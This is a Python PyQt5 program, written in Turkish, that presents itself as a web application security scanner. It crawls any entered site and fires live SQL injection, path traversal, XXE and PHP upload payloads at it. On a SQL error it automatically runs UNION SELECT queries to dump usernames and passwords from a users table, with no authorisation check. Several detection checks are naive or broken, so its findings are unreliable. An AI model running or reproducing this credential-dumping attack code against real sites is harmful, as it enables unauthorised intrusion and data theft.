import sys
import requests
from bs4 import BeautifulSoup
from PyQt5.QtCore import QTimer
import re
from urllib.parse import urljoin, urlparse, parse_qs
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton,
                             QTextEdit, QProgressBar, QTabWidget, QStyleFactory, QTreeWidget, QTreeWidgetItem,
                             QSplitter, QFrame)
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QPropertyAnimation, QEasingCurve
from PyQt5.QtGui import QColor, QPalette, QFont, QIcon
import ssl
import socket
import asyncio
import aiohttp

class TarayiciMotoru(QThread):
    ilerlemeSinyali = pyqtSignal(int)
    sonucSinyali = pyqtSignal(list)
    logSinyali = pyqtSignal(str)
    sqlAcigiIstismarSinyali = pyqtSignal(dict)  # Yeni sinyal

    def __init__(self, hedef_url, max_url=100, is_parcacigi=10):
        super().__init__()
        self.hedef_url = hedef_url
        self.max_url = max_url
        self.is_parcacigi = is_parcacigi
        self.ziyaret_edilen_urller = set()
        self.guvenlik_aciklari = []
        self.session = None

    async def tara(self, url):
        if url in self.ziyaret_edilen_urller or len(self.ziyaret_edilen_urller) >= self.max_url:
            return

        self.ziyaret_edilen_urller.add(url)
        self.ilerlemeSinyali.emit(len(self.ziyaret_edilen_urller))
        self.logSinyali.emit(f"Taranıyor: {url}")

        try:
            async with self.session.get(url, timeout=10) as yanit:
                icerik = await yanit.text()
                corba = BeautifulSoup(icerik, 'html.parser')

                await self.xss_kontrol(url, icerik)
                await self.sql_enjeksiyon_kontrol(url)
                await self.acik_yonlendirme_kontrol(url)
                await self.ssl_kontrol(url)
                await self.clickjacking_kontrol(yanit)
                await self.dosya_ekleme_kontrol(url)
                await self.cors_kontrol(yanit)
                await self.http_only_kontrol(yanit)
                await self.path_traversal_kontrol(url)
                await self.xxe_kontrol(url)
                await self.csrf_kontrol(icerik)
                await self.idor_kontrol(url)

                linkler = corba.find_all('a', href=True)
                return [urljoin(url, link['href']) for link in linkler if
                        urljoin(url, link['href']).startswith(self.hedef_url)]

        except Exception as e:
            self.logSinyali.emit(f"{url} taranırken hata oluştu: {e}")
            return []

    async def xss_kontrol(self, url, icerik):
        xss_desenleri = [
            r'<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>',
            r'on\w+\s*=\s*"[^"]*"',
            r'javascript:'
        ]
        for desen in xss_desenleri:
            if re.search(desen, icerik, re.IGNORECASE):
                aciklama = (
                        "Potansiyel XSS (Cross-Site Scripting) güvenlik açığı bulundu. "
                        "Bu açık, saldırganların kullanıcı tarayıcısında kötü amaçlı scriptler çalıştırmasına olanak tanır. "
                        f"Açığın bulunduğu URL: {url}\n"
                        "Saldırı yöntemi:\n"
                        "1. Kötü amaçlı bir script içeren bir URL oluşturun. Örnek: " + url + '?input=<script>alert("XSS")</script>\n'
                                                                                              "2. Kullanıcıyı bu URL'yi ziyaret etmeye ikna edin.\n"
                                                                                              "3. Kullanıcının tarayıcısı scripti çalıştıracak ve potansiyel olarak hassas bilgileri çalabilecektir.\n"
                                                                                              "Önlem: Tüm kullanıcı girdilerini doğrulayın ve HTML kodunu çıkartın veya güvenli bir şekilde kodlayın."
                )
                self.guvenlik_aciklari.append({
                    "tip": "XSS",
                    "url": url,
                    "aciklama": aciklama
                })
                self.logSinyali.emit(f"XSS açığı bulundu: {url}")
                break

    async def sql_enjeksiyon_kontrol(self, url):
        yukler = ["'", "\"", "OR 1=1", "' OR '1'='1"]
        for yuk in yukler:
            test_url = f"{url}{'&' if '?' in url else '?'}id={yuk}"
            try:
                async with self.session.get(test_url, timeout=10) as yanit:
                    icerik = await yanit.text()
                    if "SQL syntax" in icerik or "mysql_fetch_array()" in icerik:
                        aciklama = (
                            "Potansiyel SQL Enjeksiyonu güvenlik açığı bulundu. "
                            "Bu açık, saldırganların veritabanına yetkisiz erişim sağlamasına olanak tanır. "
                            f"Açığın bulunduğu URL: {test_url}\n"
                            "Saldırı yöntemi:\n"
                            f"1. Şu URL'yi kullanın: {test_url}\n"
                            "2. Bu, veritabanı sorgusunu manipüle edebilir ve tüm kayıtları döndürebilir.\n"
                            "3. Saldırgan, veritabanındaki hassas bilgilere erişebilir veya verileri değiştirebilir.\n"
                            "Önlem: Parametreli sorgular kullanın ve kullanıcı girdilerini doğrulayın."
                        )
                        self.guvenlik_aciklari.append({
                            "tip": "SQL Enjeksiyonu",
                            "url": test_url,
                            "aciklama": aciklama
                        })
                        self.logSinyali.emit(f"SQL Enjeksiyonu açığı bulundu: {test_url}")
                        await self.sql_acigi_istismar_et(test_url)  # Yeni eklenen satır
                        break
            except Exception:
                pass

    async def sql_acigi_istismar_et(self, url):
        # Bu metod, tespit edilen SQL açığını istismar etmeye çalışır
        payloads = [
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT username,password,NULL FROM users--"
        ]

        results = {}
        for payload in payloads:
            exploit_url = f"{url}{payload}"
            try:
                async with self.session.get(exploit_url, timeout=10) as response:
                    content = await response.text()
                    soup = BeautifulSoup(content, 'html.parser')
                    # Bu kısım, sitenin yapısına göre ayarlanmalıdır
                    data = soup.find_all('td')  # Örnek olarak, tüm tablo hücrelerini alıyoruz
                    results[payload] = [item.text for item in data]
            except Exception as e:
                results[payload] = f"Hata: {str(e)}"

        self.sqlAcigiIstismarSinyali.emit({"url": url, "results": results})
    async def acik_yonlendirme_kontrol(self, url):
        test_url = f"{url}{'&' if '?' in url else '?'}redirect=https://example.com"
        try:
            async with self.session.get(test_url, timeout=10, allow_redirects=False) as yanit:
                if yanit.status in (301, 302) and 'example.com' in yanit.headers.get('Location', ''):
                    aciklama = (
                        "Potansiyel Açık Yönlendirme güvenlik açığı bulundu. "
                        "Bu açık, saldırganların kullanıcıları zararlı sitelere yönlendirmesine olanak tanır. "
                        f"Açığın bulunduğu URL: {test_url}\n"
                        "Saldırı yöntemi:\n"
                        f"1. Şu URL'yi kullanın: {test_url}\n"
                        "2. Bu, kullanıcıyı example.com'a yönlendirir, ancak bir saldırgan bunu kötü amaçlı bir siteye değiştirebilir.\n"
                        "3. Kullanıcı, orijinal sitenin güvenilirliğine güvenerek zararlı siteye gidebilir.\n"
                        "Önlem: Yönlendirme URL'lerini bir beyaz listeyle kontrol edin veya göreceli URL'ler kullanın."
                    )
                    self.guvenlik_aciklari.append({
                        "tip": "Açık Yönlendirme",
                        "url": test_url,
                        "aciklama": aciklama
                    })
                    self.logSinyali.emit(f"Açık Yönlendirme açığı bulundu: {test_url}")
        except Exception:
            pass

    async def ssl_kontrol(self, url):
        try:
            hostname = url.split("://")[-1].split("/")[0]
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as secure_sock:
                    cert = secure_sock.getpeercert()

            self.logSinyali.emit(f"SSL sertifikası kontrol edildi: {url}")
            if cert['notAfter'] < cert['notBefore']:
                aciklama = (
                    "SSL sertifikası geçersiz veya süresi dolmuş. "
                    "Bu, man-in-the-middle saldırılarına karşı savunmasızlığa yol açabilir. "
                    f"Etkilenen URL: {url}\n"
                    "Potansiyel saldırı yöntemi:\n"
                    "1. Saldırgan, kullanıcı ile sunucu arasındaki trafiği yakalayabilir.\n"
                    "2. Geçersiz SSL nedeniyle, şifreli iletişim güvenli değildir.\n"
                    "3. Hassas bilgiler (örn. şifreler) çalınabilir.\n"
                    "Önlem: SSL sertifikasını yenileyin ve düzenli olarak kontrol edin."
                )
                self.guvenlik_aciklari.append({
                    "tip": "SSL Sertifika Hatası",
                    "url": url,
                    "aciklama": aciklama
                })
                self.logSinyali.emit(f"SSL sertifika hatası bulundu: {url}")
        except Exception as e:
            aciklama = (
                f"SSL bağlantısı kurulamadı: {str(e)}. "
                "Bu, güvensiz iletişime veya sertifika sorunlarına işaret edebilir. "
                f"Etkilenen URL: {url}\n"
                "Potansiyel riskler:\n"
                "1. İletişim şifrelenmemiş olabilir, bu da veri hırsızlığına yol açabilir.\n"
                "2. Sunucu kimliği doğrulanamıyor, bu da olası bir kimlik avı saldırısı olabilir.\n"
                "Önlem: SSL yapılandırmasını kontrol edin ve geçerli bir sertifika kullandığınızdan emin olun."
            )
            self.guvenlik_aciklari.append({
                "tip": "SSL Hatası",
                "url": url,
                "aciklama": aciklama
            })
            self.logSinyali.emit(f"SSL hatası: {url} - {str(e)}")

    async def clickjacking_kontrol(self, yanit):
        x_frame_options = yanit.headers.get('X-Frame-Options')
        content_security_policy = yanit.headers.get('Content-Security-Policy')

        if not x_frame_options and not (
        'frame-ancestors' in content_security_policy if content_security_policy else False):
            aciklama = (
                "Clickjacking açığı tespit edildi. "
                "Bu açık, saldırganların kullanıcıları gizli bir çerçeve içinde zararlı eylemleri gerçekleştirmeye kandırmasına olanak tanır. "
                f"Etkilenen URL: {yanit.url}\n"
                "Saldırı yöntemi:\n"
                "1. Saldırgan, hedef siteyi gizli bir iframe içinde kendi sitesine gömer.\n"
                "2. Kullanıcı, üstteki sahte içeriğe tıkladığını düşünürken aslında alttaki gizli siteyle etkileşime girer.\n"
                "3. Bu, istenmeyen işlemlerin gerçekleştirilmesine yol açabilir.\n"
                "Önlem: X-Frame-Options header'ını 'DENY' veya 'SAMEORIGIN' olarak ayarlayın, ya da Content Security Policy'de frame-ancestors direktifini kullanın."
            )
            self.guvenlik_aciklari.append({
                "tip": "Clickjacking",
                "url": str(yanit.url),
                "aciklama": aciklama
            })
            self.logSinyali.emit(f"Clickjacking açığı bulundu: {yanit.url}")

    async def dosya_ekleme_kontrol(self, url):
        dosya = {'dosya': ('test.php', '<?php echo "Test"; ?>')}
        async with self.session.post(url, data=dosya) as yanit:
            if 'image/jpeg' not in yanit.headers.get('Content-Type', ''):
                aciklama = (
                    "Potansiyel dosya yükleme açığı tespit edildi. "
                    "Bu açık, saldırganların zararlı dosyaları sunucuya yüklemesine ve çalıştırmasına olanak tanıyabilir. "
                    f"Etkilenen URL: {url}\n"
                    "Saldırı yöntemi:\n"
                    "1. Saldırgan, zararlı bir PHP dosyası yüklemeye çalışır.\n"
                    "2. Sunucu, dosya türünü düzgün kontrol etmezse, PHP dosyası kabul edilebilir.\n"
                    "3. Yüklenen PHP dosyası sunucuda çalıştırılabilir, bu da uzaktan kod yürütme açığına yol açar.\n"
"Önlem: Dosya türlerini sıkı bir şekilde kontrol edin, yüklenen dosyaları güvenli bir dizinde saklayın ve asla doğrudan çalıştırmayın."
                )
                self.guvenlik_aciklari.append({
                    "tip": "Dosya Yükleme Açığı",
                    "url": url,
                    "aciklama": aciklama
                })
                self.logSinyali.emit(f"Dosya yükleme açığı bulundu: {url}")

    async def cors_kontrol(self, yanit):
        access_control_allow_origin = yanit.headers.get('Access-Control-Allow-Origin')
        if access_control_allow_origin == '*':
            aciklama = (
                "CORS (Cross-Origin Resource Sharing) yanlış yapılandırılmış. "
                "Bu, herhangi bir kaynaktan gelen isteklerin kabul edilmesine neden olur ve potansiyel güvenlik riskleri oluşturur. "
                f"Etkilenen URL: {yanit.url}\n"
                "Saldırı yöntemi:\n"
                "1. Saldırgan, kötü amaçlı bir web sitesi oluşturur.\n"
                "2. Bu site, kurbanın tarayıcısından hedef siteye XHR isteği gönderir.\n"
                "3. Yanlış CORS yapılandırması nedeniyle, bu istek kabul edilir ve hassas veriler sızdırılabilir.\n"
                "Önlem: Access-Control-Allow-Origin başlığını sadece güvenilir kaynaklarla sınırlayın."
            )
            self.guvenlik_aciklari.append({
                "tip": "CORS Yanlış Yapılandırma",
                "url": str(yanit.url),
                "aciklama": aciklama
            })
            self.logSinyali.emit(f"CORS yanlış yapılandırma bulundu: {yanit.url}")

    async def http_only_kontrol(self, yanit):
        set_cookie = yanit.headers.get('Set-Cookie')
        if set_cookie and 'HttpOnly' not in set_cookie:
            aciklama = (
                "HttpOnly bayrağı çerezlerde eksik. "
                "Bu, client-side scriptlerin (örn. XSS saldırıları) çerezlere erişmesine olanak tanır. "
                f"Etkilenen URL: {yanit.url}\n"
                "Saldırı yöntemi:\n"
                "1. Saldırgan, siteye XSS açığı enjekte eder.\n"
                "2. Kötü amaçlı script, HttpOnly olmayan çerezlere erişebilir.\n"
                "3. Oturum çerezleri çalınabilir, bu da hesap ele geçirmeye yol açabilir.\n"
                "Önlem: Tüm hassas çerezlere (özellikle oturum çerezleri) HttpOnly bayrağını ekleyin."
            )
            self.guvenlik_aciklari.append({
                "tip": "HttpOnly Bayrağı Eksik",
                "url": str(yanit.url),
                "aciklama": aciklama
            })
            self.logSinyali.emit(f"HttpOnly bayrağı eksik: {yanit.url}")

    async def path_traversal_kontrol(self, url):
        test_paths = ['../../../etc/passwd', '..\..\Windows\win.ini', 'file:///etc/passwd']
        for path in test_paths:
            test_url = f"{url}?file={path}"
            async with self.session.get(test_url) as yanit:
                icerik = await yanit.text()
                if 'root:' in icerik or '[extensions]' in icerik:
                    aciklama = (
                        "Path Traversal (Dizin Gezinme) açığı tespit edildi. "
                        "Bu açık, saldırganların sunucu dosya sisteminde yetkisiz gezinmesine ve hassas dosyalara erişmesine olanak tanır. "
                        f"Etkilenen URL: {test_url}\n"
                        "Saldırı yöntemi:\n"
                        f"1. Saldırgan, şu URL'yi kullanır: {test_url}\n"
                        "2. Sunucu, dosya yolunu düzgün doğrulamazsa, istenmeyen dosyaları okuyabilir.\n"
                        "3. Bu, hassas sistem dosyalarının içeriğinin ifşa edilmesine yol açabilir.\n"
                        "Önlem: Kullanıcı girdilerini sıkı bir şekilde doğrulayın ve dosya erişimlerini kısıtlayın."
                    )
                    self.guvenlik_aciklari.append({
                        "tip": "Path Traversal",
                        "url": test_url,
                        "aciklama": aciklama
                    })
                    self.logSinyali.emit(f"Path Traversal açığı bulundu: {test_url}")
                    break

    async def xxe_kontrol(self, url):
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""

        headers = {'Content-Type': 'application/xml'}
        async with self.session.post(url, data=xxe_payload, headers=headers) as yanit:
            icerik = await yanit.text()
            if 'root:' in icerik:
                aciklama = (
                    "XXE (XML External Entity) açığı tespit edildi. "
                    "Bu açık, XML işleyicinin dış varlıkları çözümlemesine izin vererek hassas dosyaların okunmasına veya diğer saldırılara olanak tanır. "
                    f"Etkilenen URL: {url}\n"
                    "Saldırı yöntemi:\n"
                    "1. Saldırgan, özel hazırlanmış bir XML yükü gönderir.\n"
                    "2. XML işleyici, dış varlığı (bu durumda /etc/passwd dosyası) çözümler.\n"
                    "3. Hassas dosya içeriği yanıtta döndürülür.\n"
                    "Önlem: XML işleyicide dış varlık çözümlemeyi devre dışı bırakın."
                )
                self.guvenlik_aciklari.append({
                    "tip": "XXE Açığı",
                    "url": url,
                    "aciklama": aciklama
                })
                self.logSinyali.emit(f"XXE açığı bulundu: {url}")

    async def csrf_kontrol(self, icerik):
        if 'csrf' not in icerik.lower() and 'token' not in icerik.lower():
            aciklama = (
                "Potansiyel CSRF (Cross-Site Request Forgery) açığı tespit edildi. "
                "Bu açık, saldırganların kullanıcının kimlik bilgilerini kullanarak yetkisiz işlemler gerçekleştirmesine olanak tanır. "
                "Etkilenen sayfa içeriğinde CSRF token'ı bulunamadı.\n"
                "Saldırı yöntemi:\n"
                "1. Saldırgan, kötü amaçlı bir web sayfası oluşturur.\n"
                "2. Kullanıcı bu sayfayı ziyaret ettiğinde, gizli bir form otomatik olarak gönderilir.\n"
                "3. Hedef site CSRF koruması olmadığından, istek geçerli sayılır ve işlem gerçekleştirilir.\n"
                "Önlem: Tüm önemli işlemler için benzersiz CSRF token'ları kullanın."
            )
            self.guvenlik_aciklari.append({
                "tip": "CSRF Açığı",
                "url": "Tüm sayfalar",
                "aciklama": aciklama
            })
            self.logSinyali.emit("Potansiyel CSRF açığı bulundu")

    async def idor_kontrol(self, url):
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        for param, value in query_params.items():
            if param.lower() in ['id', 'user_id', 'account_id']:
                test_values = [str(int(value[0]) + 1), str(int(value[0]) - 1)] if value[0].isdigit() else ['1', '2']
                for test_value in test_values:
                    test_url = url.replace(f"{param}={value[0]}", f"{param}={test_value}")
                    async with self.session.get(test_url) as yanit:
                        if yanit.status == 200:
                            aciklama = (
                                "Potansiyel IDOR (Insecure Direct Object Reference) açığı tespit edildi. "
                                "Bu açık, kullanıcıların yetkisiz nesnelere erişmesine olanak tanır. "
                                f"Etkilenen URL: {test_url}\n"
                                "Saldırı yöntemi:\n"
                                f"1. Orijinal URL: {url}\n"
                                f"2. Değiştirilen URL: {test_url}\n"
                                "3. Değiştirilen URL de geçerli bir yanıt döndürdü, bu da yetkisiz erişim olasılığını gösterir.\n"
                                "Önlem: Nesne referanslarını kullanıcı yetkileriyle doğrulayın ve dolaylı nesne referansları kullanın."
                            )
                            self.guvenlik_aciklari.append({
                                "tip": "IDOR Açığı",
                                "url": test_url,
                                "aciklama": aciklama
                            })
                            self.logSinyali.emit(f"IDOR açığı bulundu: {test_url}")
                            return  # İlk bulduğumuzda döngüyü kırıyoruz

    async def tarama_yap(self):
        self.session = aiohttp.ClientSession()
        taranacaklar = [self.hedef_url]
        while taranacaklar:
            gorevler = [self.tara(url) for url in taranacaklar[:self.is_parcacigi]]
            yeni_urller = await asyncio.gather(*gorevler)
            taranacaklar = taranacaklar[self.is_parcacigi:]
            for urls in yeni_urller:
                if urls:
                    taranacaklar.extend(urls)
        await self.session.close()

    def run(self):
        asyncio.run(self.tarama_yap())
        self.sonucSinyali.emit(self.guvenlik_aciklari)


class WebGuvenlikTarayicisi(QWidget):
    def __init__(self):
        super().__init__()
        self.arayuz_olustur()

    def arayuz_olustur(self):
        self.setWindowTitle('Gelişmiş Web Uygulama Güvenlik Tarayıcısı')
        self.setGeometry(100, 100, 1200, 800)
        self.setStyleSheet("""
            QWidget {
                background-color: #2C3E50;
                color: #ECF0F1;
                font-family: 'Segoe UI', sans-serif;
            }
            QLineEdit, QTextEdit {
                background-color: #34495E;
                border: 1px solid #7F8C8D;
                border-radius: 5px;
                padding: 5px;
                color: #ECF0F1;
            }
            QPushButton {
                background-color: #3498DB;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #2980B9;
            }
            QPushButton:pressed {
                background-color: #2574A9;
            }
            QProgressBar {
                border: 2px solid #3498DB;
                border-radius: 5px;
                text-align: center;
            }
            QProgressBar::chunk {
                background-color: #3498DB;
            }
            QTabWidget::pane {
                border: 1px solid #7F8C8D;
                border-radius: 5px;
            }
            QTabBar::tab {
                background-color: #34495E;
                color: #ECF0F1;
                padding: 8px 20px;
                margin-right: 2px;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
            }
            QTabBar::tab:selected {
                background-color: #3498DB;
            }
            QTreeWidget {
                background-color: #34495E;
                border: 1px solid #7F8C8D;
                border-radius: 5px;
            }
            QTreeWidget::item {
                padding: 5px;
            }
            QTreeWidget::item:selected {
                background-color: #3498DB;
            }
        """)

        ana_duzen = QVBoxLayout()

        # Başlık
        baslik = QLabel('Web Uygulama Güvenlik Tarayıcısı')
        baslik.setStyleSheet("font-size: 24px; font-weight: bold; margin-bottom: 20px;")
        baslik.setAlignment(Qt.AlignCenter)
        ana_duzen.addWidget(baslik)
        
        # İmza ekleme
        imza = QLabel('Geliştirildi by Kerim Aksanoğlu')
        imza.setStyleSheet("font-size: 10px; color: #7F8C8D; margin-top: 10px;")
        imza.setAlignment(Qt.AlignRight)
        ana_duzen.addWidget(imza)

        self.setLayout(ana_duzen)
        # URL giriş alanı
        url_duzen = QHBoxLayout()
        url_etiket = QLabel('Hedef URL:')
        url_etiket.setStyleSheet("font-size: 16px;")
        self.url_girisi = QLineEdit()
        self.url_girisi.setPlaceholderText("https://example.com")
        self.tara_butonu = QPushButton('Taramayı Başlat')
        self.tara_butonu.setIcon(QIcon('scan_icon.png'))  # Tarama ikonu ekleyin
        self.tara_butonu.clicked.connect(self.tarama_baslat)
        url_duzen.addWidget(url_etiket)
        url_duzen.addWidget(self.url_girisi)
        url_duzen.addWidget(self.tara_butonu)

        ana_duzen.addLayout(url_duzen)

        # İlerleme çubuğu
        self.ilerleme_cubugu = QProgressBar()
        self.ilerleme_cubugu.setTextVisible(True)
        self.ilerleme_cubugu.setFormat("%p% Tamamlandı")
        ana_duzen.addWidget(self.ilerleme_cubugu)

        # Ana içerik alanı
        icerik_bolmesi = QSplitter(Qt.Horizontal)

        # Log ve sonuç sekmeleri
        self.sekme_widget = QTabWidget()
        self.log_metni = QTextEdit()
        self.log_metni.setReadOnly(True)
        self.sonuc_agaci = QTreeWidget()
        self.sonuc_agaci.setHeaderLabels(["Güvenlik Açığı", "URL", "Açıklama"])
        self.sonuc_agaci.setColumnWidth(0, 200)
        self.sonuc_agaci.setColumnWidth(1, 300)

        self.sekme_widget.addTab(self.log_metni, "Tarama Logları")
        self.sekme_widget.addTab(self.sonuc_agaci, "Güvenlik Açıkları")

        icerik_bolmesi.addWidget(self.sekme_widget)

        # Detaylı açıklama alanı
        self.detay_alani = QTextEdit()
        self.detay_alani.setReadOnly(True)
        self.detay_alani.setPlaceholderText("Güvenlik açığı detayları burada görüntülenecek.")
        icerik_bolmesi.addWidget(self.detay_alani)

        icerik_bolmesi.setSizes([600, 400])
        ana_duzen.addWidget(icerik_bolmesi)

        self.setLayout(ana_duzen)

        # Sonuç ağacı seçim olayını bağlama
        self.sonuc_agaci.itemSelectionChanged.connect(self.gosterDetay)

    def tarama_baslat(self):
        hedef_url = self.url_girisi.text()
        if not hedef_url:
            self.log_metni.append("Lütfen geçerli bir URL girin.")
            return

        self.tara_butonu.setEnabled(False)
        self.sonuc_agaci.clear()
        self.log_metni.clear()
        self.detay_alani.clear()
        self.ilerleme_cubugu.setValue(0)

        self.tarayici = TarayiciMotoru(hedef_url)
        self.tarayici.ilerlemeSinyali.connect(self.ilerleme_guncelle)
        self.tarayici.sonucSinyali.connect(self.sonuclari_goster)
        self.tarayici.logSinyali.connect(self.log_ekle)
        self.tarayici.start()

    def ilerleme_guncelle(self, deger):
        self.ilerleme_cubugu.setValue(deger)

    def log_ekle(self, log):
        self.log_metni.append(log)

    def sonuclari_goster(self, sonuclar):
        self.sonuc_agaci.clear()
        for sonuc in sonuclar:
            item = QTreeWidgetItem(self.sonuc_agaci)
            item.setText(0, sonuc['tip'])
            item.setText(1, sonuc['url'])
            item.setText(2, sonuc['aciklama'][:50] + "...")  # Kısa açıklama
            item.setData(0, Qt.UserRole, sonuc['aciklama'])  # Tam açıklamayı veri olarak saklama

        self.tara_butonu.setEnabled(True)
        self.ilerleme_cubugu.setValue(100)
        self.log_metni.append("Tarama tamamlandı.")

        # Animasyonlu bildirim
        self.bildirim_goster("Tarama Tamamlandı", "Güvenlik açıkları tespit edildi. Sonuçları inceleyin.")

    def gosterDetay(self):
        secili_itemler = self.sonuc_agaci.selectedItems()
        if secili_itemler:
            item = secili_itemler[0]
            detay = item.data(0, Qt.UserRole)
            self.detay_alani.setPlainText(detay)

    def bildirim_goster(self, baslik, mesaj):
        bildirim = QFrame(self)
        bildirim.setStyleSheet("""
            background-color: #27AE60;
            border-radius: 10px;
            padding: 10px;
        """)
        bildirim_duzen = QVBoxLayout(bildirim)
        baslik_label = QLabel(baslik)
        baslik_label.setStyleSheet("font-weight: bold; color: white;")
        mesaj_label = QLabel(mesaj)
        mesaj_label.setStyleSheet("color: white;")
        bildirim_duzen.addWidget(baslik_label)
        bildirim_duzen.addWidget(mesaj_label)

        bildirim.setGeometry(self.width() - 320, self.height() - 100, 300, 80)
        bildirim.show()

        # Animasyon
        self.anim = QPropertyAnimation(bildirim, b"geometry")
        self.anim.setDuration(300)
        self.anim.setStartValue(bildirim.geometry())
        self.anim.setEndValue(bildirim.geometry().adjusted(0, 100, 0, 100))
        self.anim.setEasingCurve(QEasingCurve.InOutCubic)
        self.anim.start()

        # 3 saniye sonra bildirimi kaldır
        QTimer.singleShot(3000, bildirim.deleteLater)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyle(QStyleFactory.create('Fusion'))  # Modern görünüm için Fusion stilini kullan
    tarayici = WebGuvenlikTarayicisi()
    tarayici.show()
    sys.exit(app.exec_())
